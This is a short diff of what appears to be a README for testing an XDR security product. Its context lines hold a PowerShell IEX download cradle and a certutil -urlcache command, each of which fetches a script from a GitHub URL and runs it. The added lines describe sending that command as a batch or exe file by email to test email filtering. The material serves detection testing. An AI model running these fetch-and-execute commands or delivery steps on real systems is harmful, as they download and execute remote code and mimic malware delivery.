@@ -16,3 +16,7 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser
 
 ## test xdr 2, open admin cmd prompt and paste code below
 certutil.exe -urlcache -f https://raw.githubusercontent.com/chackco/poc/master/testxdr.bat.txt c:\testxdr.bat && c:\testxdr.bat
+
+## you can mix and match like
+save above command as batch/ convert to exe and send using email
+after open email > save file and run batch/exe to test email module
